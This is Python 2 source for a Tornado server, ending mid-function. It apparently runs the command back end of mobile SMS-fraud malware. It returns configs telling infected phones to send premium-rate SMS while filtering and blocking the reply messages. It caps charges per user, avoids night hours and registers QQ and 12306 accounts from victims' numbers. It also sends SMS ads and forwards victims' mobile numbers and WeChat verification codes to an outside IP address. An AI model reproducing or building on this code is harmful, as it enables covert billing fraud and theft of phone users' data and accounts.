# coding: utf-8

import struct
import time
from datetime import datetime
import json
import sys
import re
import geoip2.database
import threading
import random
import tornado
import tornado.web
from log import logger

# private lib
import config
import public

# from Bastion import _test

import pymysql
pymysql.install_as_MySQLdb()
import MySQLdb
from DBUtils.PooledDB import PooledDB
from tornado import gen
from tornado.httpclient import AsyncHTTPClient
from pymongo import MongoClient
from gevent.greenlet import Greenlet
from gevent import monkey
monkey.patch_all()
import gevent
# import requests
reload(sys)
sys.setdefaultencoding("utf-8")

poolConfig = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['config_db']['host'], user=config.GLOBAL_SETTINGS['config_db']['user'], passwd=config.GLOBAL_SETTINGS[
                      'config_db']['psw'], db=config.GLOBAL_SETTINGS['config_db']['name'], port=config.GLOBAL_SETTINGS['config_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
poolLog = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['log_db']['host'], user=config.GLOBAL_SETTINGS['log_db']['user'], passwd=config.GLOBAL_SETTINGS[
    'log_db']['psw'], db=config.GLOBAL_SETTINGS['log_db']['name'], port=config.GLOBAL_SETTINGS['log_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
systemConfigs = {}
registerTargetConfigs = {}
ivrConfigs = {}
gMongoCli = MongoClient(config.GLOBAL_SETTINGS['mongodb'])

MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
MATCH_CONTENT += "<wml>"
MATCH_CONTENT += "<card>"
MATCH_CONTENT += "<Ccmd_cust>zp[id]</Ccmd_cust>"
MATCH_CONTENT += "<Cnum_cust>[mobile]</Cnum_cust>"
MATCH_CONTENT += "<filter1_cust></filter1_cust>"
MATCH_CONTENT += "<filter2_cust></filter2_cust>"
MATCH_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
MATCH_CONTENT += "<fee></fee>"
MATCH_CONTENT += "<autofee></autofee>"
MATCH_CONTENT += "<feemode>-2</feemode>"
MATCH_CONTENT += "</card>"
MATCH_CONTENT += "</wml>"

FEE_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
FEE_CONTENT += "<wml>"
FEE_CONTENT += "<card>"
FEE_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
FEE_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
FEE_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
FEE_CONTENT += "<filter2_cust></filter2_cust>"
FEE_CONTENT += "<Creconfirm_cust>[reconfirm]</Creconfirm_cust>"
FEE_CONTENT += "<PortShield>[portShield]</PortShield>"
FEE_CONTENT += "<fee></fee>"
FEE_CONTENT += "<autofee>[times]</autofee>"
FEE_CONTENT += "<feemode>11</feemode>"
FEE_CONTENT += "</card>"
FEE_CONTENT += "</wml>"

SMS_REGISTER_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
SMS_REGISTER_CONTENT += "<wml>"
SMS_REGISTER_CONTENT += "<card>"
SMS_REGISTER_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
SMS_REGISTER_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
SMS_REGISTER_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
SMS_REGISTER_CONTENT += "<filter2_cust></filter2_cust>"
SMS_REGISTER_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
SMS_REGISTER_CONTENT += "<PortShield>[portShield]</PortShield>"
SMS_REGISTER_CONTENT += "<fee></fee>"
SMS_REGISTER_CONTENT += "<autofee>1</autofee>"
SMS_REGISTER_CONTENT += "<feemode>11</feemode>"
SMS_REGISTER_CONTENT += "</card>"
SMS_REGISTER_CONTENT += "</wml>"

IVR_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
IVR_CONTENT += "<wml>"
IVR_CONTENT += "<card>"
IVR_CONTENT += "<feemode>31</feemode>"
IVR_CONTENT += "<CallTime>[CallTime]</CallTime>"
IVR_CONTENT += "<Addr>[spNumber]</Addr>"
IVR_CONTENT += "<TimeKeys>[TimeKeys]</TimeKeys>"
IVR_CONTENT += "<SMSKey>[SMSKey]</SMSKey>"
IVR_CONTENT += "<PortShield>[PortShield]</PortShield>"
IVR_CONTENT += "</card>"
IVR_CONTENT += "</wml>"

TEST_CONTENT = ""

MATCH_FLOW_LIMIT_PER_MINUTE = {'minute': 0, 'count': 0}
TRY_MORE_TIMES = 2


def match_flow_control():
    global MATCH_FLOW_LIMIT_PER_MINUTE
    _current_minute = int(time.strftime("%M", time.localtime()))
    if MATCH_FLOW_LIMIT_PER_MINUTE['minute'] != _current_minute:
        MATCH_FLOW_LIMIT_PER_MINUTE = {'minute': _current_minute, 'count': 0}
    if MATCH_FLOW_LIMIT_PER_MINUTE['count'] < int(get_system_parameter_from_db("matchFlowLimitPerMinute")):
        MATCH_FLOW_LIMIT_PER_MINUTE['count'] += 1
        return True
    else:
        return False


class MatchHandler(tornado.web.RequestHandler):

    def get(self):
        _dbConfig = poolConfig.connection()
        _cur = _dbConfig.cursor()
        _sql = 'SELECT imsi FROM `imsi_users` WHERE id = %s '
        _cur.execute(_sql, [self.get_argument('id')])
        _recordRsp = _cur.fetchone()
        if _recordRsp != None:
            _sql = "update `imsi_users` set mobile=%s where id = %s"
            _cur.execute(_sql, [self.get_argument(
                'mobile'), self.get_argument('id')])
        _cur.close()
        _dbConfig.close()


class TestHandler(tornado.web.RequestHandler):

    def get(self):
        self.write("ok")

    def post(self, *args, **kwargs):
        self.write("ok")
        print('post test:')
        print(self.request.body)
        # testJ = json.loads(self.request.body)
        # print(testJ)


@gen.coroutine
def async_report_weixin2nd(info):
    url = "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=c159&pid=wx159&mobile=" + \
        info['mobile'] + "&ccpara=&smsContent=%s" % (info['remark'])
    http_client = AsyncHTTPClient()
    request = tornado.httpclient.HTTPRequest(
        url, method='GET',  request_timeout=3, connect_timeout=3)
    response = yield http_client.fetch(request)
    log_notify(url, response, 334)


class MainHandler(tornado.web.RequestHandler):

    def get(self):
        self.write("Hello, world")

    # @tornado.web.asynchronous
    # @tornado.gen.coroutine
    def post(self, *args, **kwargs):
        threads = []
        _begin_time = int(round(time.time() * 1000))
        reqInfo = {}
        reqInfo["imsi"] = filter(str.isdigit, self.request.body[64:80])
        reqInfo["custCode"] = (str(self.request.body[32:47])).strip()
        reqInfo["proCode"] = (str(self.request.body[48:63])).strip()
        reqInfo['svn'] = struct.unpack(
            "<L", self.request.body[4:7] + b"\x00")[0]
        # reqInfo["ip"] = self.request.headers["X-Real-IP"]
        reqInfo["ip"] = self.request.remote_ip
        reqInfo['rspContent'] = ''
        _test_imsi_info = check_test_imsi(reqInfo["imsi"])
        if _test_imsi_info == None:
            # process normal user
            _rsp_content = get_imsi_response(
                reqInfo["imsi"], threads, reqInfo['svn'])
            reqInfo['rspContent'] = _rsp_content
            if _rsp_content != None:
                self.write(_rsp_content)
        else:
            _rsp_content = get_test_response(_test_imsi_info)
            if _test_imsi_info['testStatus'] == 'wxmo':
                async_report_weixin2nd(_test_imsi_info)
                _g_delete_wxmo_record = delete_wxmo_record(
                    str(reqInfo["imsi"]))
                _g_delete_wxmo_record.start()
                # threads.append(threading.Thread(
                #     target=delete_wxmo_record(str(reqInfo["imsi"]))))
            reqInfo['rspContent'] = _rsp_content
            self.write(_rsp_content)
        # print(reqInfo['rspContent'])
        logger.debug("tcd spent:" +
                     str(int(round(time.time() * 1000)) - _begin_time))
        self.finish()
        _g_insert_req_log = insert_req_log(reqInfo)
        _g_insert_req_log.start()
        # threads.append(threading.Thread(target=insert_req_log(reqInfo)))
        # for t in threads:
        #     t.start()
        # logger.debug("current has %d threads" % (threading.activeCount() -
        # 1))


def get_imsi_response(_imsi, _threads, _svn):

    _return = ""
    relationId = 0

    @gen.coroutine
    def async_notify_url(url):
        http_client = AsyncHTTPClient()
        request = tornado.httpclient.HTTPRequest(
            url, method='GET',  request_timeout=3, connect_timeout=3)
        response = yield http_client.fetch(request)
        log_notify(url, response, 332)
        if response.code == 200:
            update_try_count()
        response = response.body.decode('utf-8')

    @gen.coroutine
    def update_try_count():
        _sql = 'update register_user_relations set tryCount = tryCount+1  where id  = %s '
        _dbConfig = poolConfig.connection()
        _dbConfig.cursor().execute(_sql, [relationId])
        _dbConfig.close()

    # _imsi = filter(str.isdigit, _imsi)
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList,ifnull(registerQqCmdCount,0) as registerQqCmdCount,ifnull(registerQqSuccessCount,0) as registerQqSuccessCount,ifnull(register12306CmdCount,0) as register12306CmdCount,ifnull(register12306SuccessCount,0) as register12306SuccessCount,insertTime FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
    _cur.execute(_sql, [str(_imsi)])
    _record_user = _cur.fetchone()
    # print(_record_user)
    ctime = int(time.time())
    if _record_user == None:
        _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
        _cur.execute(_sql, [_imsi, time.time()])
        _sql = "SELECT LAST_INSERT_ID() as id"
        _cur.execute(_sql)
        _record_user = _cur.fetchone()
        if _record_user != None and match_flow_control():
            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                '[mobile]', get_system_parameter_from_db("matchMobile"))
    else:
        if len(str(_record_user['mobile'])) <= 10 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsi")):
            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                '[mobile]', get_system_parameter_from_db("matchMobile"))
            _g_async_update_match_count = async_update_match_count(_imsi)
            _g_async_update_match_count.start()
            # _threads.append(threading.Thread(
            #     target=async_update_match_count(_imsi)))
        else:
            # normal fee process
            if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
                _return = get_cmd(_record_user, _threads)
            if (_return == None or len(_return) <= 1) and _svn >= 3900 and get_system_parameter_from_db('openIvr') == 'open':
                _return = get_ivr_cmd(_record_user, _threads)
                if _return != None:
                    1
                    # _threads.append(threading.Thread(
                    # target=insert_register_cmd_log(_record_user, _return)))
            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open':
                _return = get_register_cmd(_record_user, _threads)
                if _return != None:
                    _g_insert_register_cmd_log = insert_register_cmd_log(
                        _record_user, _return)
                    _g_insert_register_cmd_log.start()
                    # _threads.append(threading.Thread(
                    # target=insert_register_cmd_log(_record_user, _return)))
            if ctime - int(_record_user['insertTime']) > 864000 and (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open':
                _return = get_sms_ad_cmd(_record_user, _threads)
            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open':
                relationId = checkWeixinRelation(_record_user)
                if relationId > 0:
                    mobileNum = _record_user['mobile']
                    if len(_record_user['mobile']) == 13:
                        mobileNum = _record_user['mobile'][2:13]
                    async_notify_url('http://121.201.67.97:8080/verifycode/api/getWXChMobile.jsp?cid=c159&pid=wx159&mobile=%s&ccpara=%s' % (
                        mobileNum, _imsi))
    _cur.close()
    _dbConfig.close()
    return _return


@gen.coroutine
def log_notify(url, response, logId):
    _dbLog = poolLog.connection()
    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`) values (%s,%s,%s,%s,%s)'
    _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), logId,
                                   url, response.code, response.body.decode('utf-8')])
    _dbLog.close()


def checkWeixinRelation(_user):
    _result = 0
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT id FROM register_user_relations where imsi=%s and apid=102 and ifnull(fetchTime,0)>0 and tryCount<%s and ifnull(lastSendTime,0)<unix_timestamp(now())-86400*%s '
    _cur.execute(_sql, [_user['imsi'], systemConfigs[
                 'relationTryCountLimit'], systemConfigs['weixin2ndRegisterDayLimit']])
    _record = _cur.fetchone()
    if _record != None:
        _result = _record['id']
    _cur.close()
    _dbConfig.close()
    return _result


def get_sms_ad_cmd(_user, _threads):
    _result = None
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT * FROM wait_send_ads order by id limit 1 '
    _cur.execute(_sql)
    _record = _cur.fetchone()
    if _record != None:
        _result = SMS_REGISTER_CONTENT.replace(
            '[cmd]', _record['msg']).replace('[spNumber]', _record['targetMobile']).replace('[filter]', '').replace('[portShield]', _record['targetMobile'])
        async_sms_ad_cmd(_record, _user, _result, _threads)
    _cur.close()
    _dbConfig.close()
    return _result


def async_sms_ad_cmd(_record, _user, _return, _threads):
    _g_delete_wait_sms_ad = delete_wait_sms_ad(_record)
    _g_delete_wait_sms_ad.start()
    # _threads.append(threading.Thread(
    #     target=delete_wait_sms_ad(_record)))
    _g_log_sms_ad_cmd = log_sms_ad_cmd(_record, _user, _return)
    _g_log_sms_ad_cmd.start()
    # _threads.append(threading.Thread(
    #     target=log_sms_ad_cmd(_record, _user, _return)))
    # _threads.append(threading.Thread(
    #     target=report_sms_ad(_record, _user)))


# def report_sms_ad(_record, _user):
#     beginTime = int(time.time() * 1000)
#     url = 'http://218.17.211.49:6068/ido/report.php?cid=10354&imei=' + str(_record['oriImei']) + '&imsi=' + str(_record['oriImsi']) + '&sdk=21&msgid=' + str(
#         _record['oriMsgId']) + '&taskid=' + str(_record['oriTaskId']) + '&phone=' + str(_record['oriMsgId']) + '&send=1&deliver=1'
#     _r = requests.get(url)
#     endTime = int(time.time() * 1000)
#     _dbLog = poolLog.connection()
#     _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
#     ctime = int(time.time())
#     _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 421,
#                                    _user["imsi"], _user["mobile"], url, endTime - beginTime])
#     _dbLog.close()


def isOpenHour():
    _result = True
    _hour = int(time.strftime("%H", time.localtime()))
    if _hour == 23 or (_hour >= 0 and _hour <= 7):
        _result = False
    return _result


def checkHourRange(strHourRange):
    _result = False
    _hour = int(time.strftime("%H", time.localtime()))
    _arr = strHourRange.split("-")
    if _hour >= int(_arr[0]) and _hour <= int(_arr[1]):
        _result = True
    return _result


def isOpenSmsRegisterHour(_keyword):
    _result = True
    _hour = int(time.strftime("%H", time.localtime()))
    if not(_hour >= int(get_system_parameter_from_db("registerSmsCmdOpenHour" + _keyword)) and _hour <= int(get_system_parameter_from_db("registerSmsCmdCloseHour" + _keyword))):
        _result = False
    return _result


def get_cmd(_user, _threads):
    if _user['province'] != None and len(_user['province']) > 0:
        _dbConfig = poolConfig.connection()
        _cur = _dbConfig.cursor()
        _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' and ifnull(instr(closeCity,%s),0)=0 order by rand() limit 1 '
        _cur.execute(_sql, [_user['province'], _user[
                     'mobileType'], _user['city']])
        _record = _cur.fetchone()
        # print(_record)
        _cur.close()
        _dbConfig.close()
        if _record == None:
            return None
        else:
            _g_async_update_cmd_fee = async_update_cmd_fee(_user, _record)
            _g_async_update_cmd_fee.start()
            # _threads.append(threading.Thread(
            #     target=async_update_cmd_fee(_user, _record)))
            _current_cmd_content = FEE_CONTENT.replace(
                '[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace('[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
            _g_insert_fee_cmd_log = insert_fee_cmd_log(
                _user, _record, _current_cmd_content)
            _g_insert_fee_cmd_log.start()
            # if _record['spNumber'] == '10658999' and _record['msg'] == 'DH242839':
            #     _threads.append(threading.Thread(
            #         target=sync_score(_user)))
            return _current_cmd_content
    else:
        print('can not match province' + str(_user))
        return None


# def sync_score(user):
#     url = 'http://116.62.161.6/shsuwangsms'
#     mobile = user['mobile']
#     if len(user['mobile']) == 13:
#         mobile = user['mobile'][2:]
#     _r = requests.get(url, params={
#         'cpid': '10jf4750142', 'price': 10,  'tel': mobile, 'smsContent': '1'})
#     # _r = requests.get(url)
#     print(_r.url)
#     print(_r.text)

# 获取短信注册类指令


def get_register_cmd(_user, _threads):
    _result = None
    if isOpenSmsRegisterHour('Qq') and str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1 and int(get_system_parameter_from_db("qqRegisterLimit")) > 0 and int(_user['registerQqCmdCount']) <= (int(get_system_parameter_from_db("qqRegisterLimit")) + TRY_MORE_TIMES) and int(_user['registerQqSuccessCount']) < int(get_system_parameter_from_db("qqRegisterLimit")):
        _result = SMS_REGISTER_CONTENT.replace(
            '[cmd]', 'ZC').replace('[spNumber]', '10690700511').replace('[filter]', '腾讯科技|随时随地|QQ|qq')
        if _user['mobileType'] == "ChinaUnion":
            _result = _result.replace('[portShield]', '10690188')
            _g_async_update_register_cmd_count = async_update_register_cmd_count(
                _user, 'registerQqCmdCount')
            _g_async_update_register_cmd_count.start()
        elif _user['mobileType'] == "ChinaMobile":
            _result = _result.replace('[portShield]', '10690508')
            _g_async_update_register_cmd_count = async_update_register_cmd_count(
                _user, 'registerQqCmdCount')
            _g_async_update_register_cmd_count.start()
        else:
            _result = None
    elif isOpenSmsRegisterHour('12306') and str(_user['lastRegisterCmdAppIdList']).find(',5,') != -1 and int(get_system_parameter_from_db("12306RegisterLimit")) > 0 and int(_user['register12306CmdCount']) <= (int(get_system_parameter_from_db("12306RegisterLimit")) + TRY_MORE_TIMES) and int(_user['register12306SuccessCount']) < int(get_system_parameter_from_db("12306RegisterLimit")):
        _result = SMS_REGISTER_CONTENT.replace('[cmd]', '999').replace(
            '[spNumber]', '12306').replace('[filter]', '12306|铁路客服').replace('[portShield]', '12306')
        _g_async_update_register_cmd_count = async_update_register_cmd_count(
            _user, 'register12306CmdCount')
        _g_async_update_register_cmd_count.start()
    # elif str(_user['lastRegisterCmdAppIdList']).find(',102,') != -1 and registerTargetConfigs[102]['stateGet'] == 'open':
    #     _result = FEE_CONTENT.replace('[cmd]', '').replace('[spNumber]', '').replace('[filter]', '').replace(
    #         '[reconfirm]', '回复*可获').replace('[portShield]',  '').replace('[times]', '1')
    #     _threads.append(threading.Thread(
    #         target=async_update_register_cmd_mo_ready(_user, '102')))
    return _result


def get_ivr_cmd(_user, _threads):
    _result = None
    for v in ivrConfigs.values():
        # if v['state'] == 'open' and _user['mobileType'] == v['mobileType']
        # and _user["province"] in v['openProvince'] and _user["city"] not in
        # v['closeCity'] and checkHourRange(v['openHour']):
        if v['state'] == 'open' and _user['mobileType'] == v['mobileType'] and _user["province"] in v['openProvince'] and _user["city"] not in v['closeCity'] and checkHourRange(v['openHour']):
            ivrDocKey = long(_user['imsi']) * 1000 + v['id']
            ivrDoc = gMongoCli.sms.ivrs.find_one({"_id": ivrDocKey})

            if ivrDoc == None:
                _isFree = isIvrFree(v)
                if _isFree is not True:
                    ivrDoc = initialIvrDoc(ivrDocKey, v, _isFree)
                    insertIvrDoc = asyncMongoOperate(ivrDoc, 'insert')
                    insertIvrDoc.start()
                _result = proIvrRes(v, _isFree)
            else:
                if checkIvrDocOver(ivrDoc, v):
                    continue
                _isFree = isIvrFree(v)
                procExistIvrDoc(ivrDoc, v, _isFree)
                updateIvrDoc = asyncMongoOperate(ivrDoc, 'update')
                updateIvrDoc.start()
                _result = proIvrRes(v, _isFree)
            if _result != None:
                _g_insert_ivr_cmd_log = insert_ivr_cmd_log(
                    _user, _result, v)
                _g_insert_ivr_cmd_log.start()
                return _result
    return _result


class insert_ivr_cmd_log(Greenlet):

    def __init__(self, _user, _cmd_info, ivrConfig):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._user = _user
        self._cmd_info = _cmd_info
        self.ivrConfig = ivrConfig

    def run(self):
        self.insertLog(self._user, self._cmd_info, self.ivrConfig)

    def insertLog(self, _user, _cmd_info, ivrConfig):
        _dbLog = poolLog.connection()
        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 +
                                       random.randint(0, 9999), 203, _user["imsi"], _user["mobile"], _cmd_info, _user['province'], ivrConfig['spNumber'], ivrConfig['id']])
        _dbLog.close()
        return


def procExistIvrDoc(ivrDoc, ivrConfig, cmdFree):
    ctime = round(time.time())
    ivrDoc["expiredTime"] = datetime.utcfromtimestamp(
        long(ctime + 86400 * 60))
    ivrDoc["lastCmdIsFree"] = cmdFree
    if cmdFree is not True:
        _current_month = int(time.strftime("%m", time.localtime()))
        _last_cmd_month = int(time.strftime(
            "%m", time.localtime(ivrDoc["lastCmdTime"])))
        if _current_month == _last_cmd_month:
            ivrDoc["currentMonthCmdTotal"] += ivrConfig['price']
            _current_day = int(time.strftime("%d", time.localtime()))
            _last_cmd_day = int(time.strftime(
                "%d", time.localtime(ivrDoc["lastCmdTime"])))
            if _current_day == _last_cmd_day:
                ivrDoc["currentDayCmdTotal"] += ivrConfig['price']
            else:
                ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
        else:
            ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
            ivrDoc["currentMonthCmdTotal"] = ivrConfig['price']
    ivrDoc["lastCmdTime"] = long(ctime)
    return ivrDoc


def initialIvrDoc(ivrDocKey, ivrConfig, cmdFree):
    ctime = round(time.time())
    ivrDoc = {"_id": ivrDocKey}
    ivrDoc["lastCmdTime"] = long(ctime)
    # t3 = strptime("2018/3/25 13:36:02", "%Y/%m/%d %H:%M:%S")
    ivrDoc["expiredTime"] = datetime.utcfromtimestamp(
        long(ctime + 86400 * 60))
    ivrDoc["lastCmdIsFree"] = cmdFree
    if cmdFree:
        ivrDoc["currentDayCmdTotal"] = 0
        ivrDoc["currentMonthCmdTotal"] = 0
    else:
        ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
        ivrDoc["currentMonthCmdTotal"] = ivrConfig['price']
    ivrDoc["currentDayFeeTotal"] = 0
    ivrDoc["currentMonthFeeTotal"] = 0
    return ivrDoc


class asyncMongoOperate(Greenlet):
    """docstring for ClassName"""

    def __init__(self, doc, act):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self.doc = doc
        self.act = act

    def run(self):
        if self.act == 'insert':
            gMongoCli.sms.ivrs.insert(self.doc)
        elif self.act == 'update':
            gMongoCli.sms.ivrs.save(self.doc)


def proIvrRes(ivrConfig, isFree):
    result = None
    if isFree:
        result = IVR_CONTENT.replace('[CallTime]', str(getRandomInt(ivrConfig['freeCallTime']))).replace('[spNumber]', ivrConfig['spNumber']).replace(
            '[TimeKeys]', procIvrTimeKeys(ivrConfig['freeTimeKeys'])).replace('[SMSKey]', ivrConfig['filter']).replace('[PortShield]', ivrConfig['portShield'])
    else:
        result = IVR_CONTENT.replace('[CallTime]', str(getRandomInt(ivrConfig['feeCallTime']))).replace('[spNumber]', ivrConfig['spNumber']).replace(
            '[TimeKeys]', procIvrTimeKeys(ivrConfig['feeTimeKeys'])).replace('[SMSKey]', ivrConfig['filter']).replace('[PortShield]', ivrConfig['portShield'])
    return result


def procIvrTimeKeys(keysStr):
    result = ""
    if keysStr != None:
        result = str(keysStr)
        mode = re.compile(r'\d+-\d+')
        _arr = mode.findall(keysStr)
        for i in _arr:
            result = result.replace(i, str(getRandomInt(i)), 1)
    return result


def getRandomInt(arrange):
    if "-" in arrange:
        _arr = arrange.split('-')
        return random.randint(int(_arr[0]), int(_arr[1]))
    else:
        return arrange


def isIvrFree(ivrConfig):
    if random.randint(0, 99) >= ivrConfig['freeRate']:
        return False
    else:
        return True


def checkIvrDocOver(ivrDoc, ivrConfig):
    if ivrConfig["userFeeDayLimit"] * 100 <= ivrDoc["currentDayFeeTotal"]:
        return True
    if ivrConfig["userFeeMonthLimit"] * 100 <= ivrDoc["currentMonthFeeTotal"]:
        return True
    if ivrConfig["cmdFeeDayLimit"] * 100 <= ivrDoc["currentDayCmdTotal"]:
        return True
    if ivrConfig["cmdFeeMonthLimit"] * 100 <= ivrDoc["currentMonthCmdTotal"]:
        return True
    return False


class async_update_match_count(Greenlet):

    def __init__(self, _imsi):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._imsi = _imsi

    def run(self):
        self.asyncUpdateMatchCount(self._imsi)

    def asyncUpdateMatchCount(self, _imsi):
        _dbConfig = poolConfig.connection()
        _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s"
        _dbConfig.cursor().execute(_sql, [_imsi])
        _dbConfig.close()


class async_update_cmd_fee(Greenlet):

    def __init__(self, _user, _cmd):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._user = _user
        self._cmd = _cmd

    def run(self):
        self.asyncUpdateCmdFee(self._user, self._cmd)

    def asyncUpdateCmdFee(self, _user, _cmd):
        _time_current = time.time()
        _total = _cmd['price'] * _cmd['times']
        if public.is_same_month(_time_current, _user['lastCmdTime']):
            _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0)  + %s , cmdFeeSumMonth = ifnull(cmdFeeSumMonth,0) + %s where imsi = %s '
        else:
            _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0) + %s , cmdFeeSumMonth = %s where imsi = %s '
        _dbConfig = poolConfig.connection()
        _dbConfig.cursor().execute(_sql, [_time_current,
                                          _total, _total, _user['imsi']])
        _dbConfig.close()


class async_update_register_cmd_count(Greenlet):

    def __init__(self, _user, _paraName):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._user = _user
        self._paraName = _paraName

    def run(self):
        self.asyncUpdateRegisterCmdCount(self._user, self._paraName)

    def asyncUpdateRegisterCmdCount(self, _user, _paraName):
        _sql = 'update imsi_users set ' + _paraName + \
            ' = ifnull(' + _paraName + ',0)  + 1  where imsi = %s '
        _dbConfig = poolConfig.connection()
        _dbConfig.cursor().execute(_sql, [_user['imsi']])
        _dbConfig.close()


class log_sms_ad_cmd(Greenlet):

    def __init__(self, _record, _user, _return):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._record = _record
        self._user = _user
        self._return = _return

    def run(self):
        self.logSmsAdCmd(self._record, self._user, self._return)

    def logSmsAdCmd(self, _record, _user, _return):
        _dbLog = poolLog.connection()
        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
        ctime = int(time.time())
        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 411,
                                       _user["imsi"], _user["mobile"], _record["targetMobile"], _record["msg"], _record["createTime"], ctime, _record["oriContent"], _return])
        _dbLog.close()


class delete_wait_sms_ad(Greenlet):

    def __init__(self, _record):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._record = _record

    def run(self):
        self.deleteWaitSmsAd(self._record)

    def deleteWaitSmsAd(self, _record):
        _dbConfig = poolConfig.connection()
        _cur = _dbConfig.cursor()
        _sql = 'delete from wait_send_ads where id=%s '
        _cur.execute(_sql, [_record['id']])
        _cur.close()
        _dbConfig.close()


class delete_wxmo_record(Greenlet):

    def __init__(self, imsi):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self.imsi = imsi

    def run(self):
        self.deleteWxmoRecord(self.imsi)

    def deleteWxmoRecord(self, imsi):
        # imsi = filter(str.isdigit, imsi)
        _dbConfig = poolConfig.connection()
        _cur = _dbConfig.cursor()
        _sql = 'delete from test_imsis where imsi = %s '
        _cur.execute(_sql, [imsi])
        _sql = 'delete from test_responses where imsi = %s '
        _cur.execute(_sql, [imsi])
        _sql = 'update register_user_relations set tryCount=0,lastSendTime=unix_timestamp(now()) where imsi = %s and apid=102 '
        _cur.execute(_sql, [imsi])
        _cur.close()
        _dbConfig.close()


def async_update_register_cmd_mo_ready(_user, _apid):
    _sql = 'update register_user_relations set isMoReady = 1  where imsi = %s and apid= %s '
    _dbConfig = poolConfig.connection()
    _dbConfig.cursor().execute(_sql, [_user['imsi'], _apid])
    _dbConfig.close()


def check_user_cmd_fee(_user):
    if _user['cmdFeeSumMonth'] == None:
        return True
    elif int(_user['cmdFeeSumMonth']) < int(get_system_parameter_from_db('cmdFeeMonthLimit')):
        return True
    elif int(time.strftime("%m", time.localtime(int(_user['lastCmdTime'])))) != int(time.strftime("%m", time.localtime())):
        return True
    else:
        return False


class insert_req_log(Greenlet):

    def __init__(self, arg):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self.arg = arg

    def run(self):
        self.insertReqLog(self.arg)
        # gMongoCli.sms.ivrs.insert(arg)

    def insertReqLog(self, _reqInfo):
        # imsi = filter(str.isdigit, _reqInfo["imsi"])
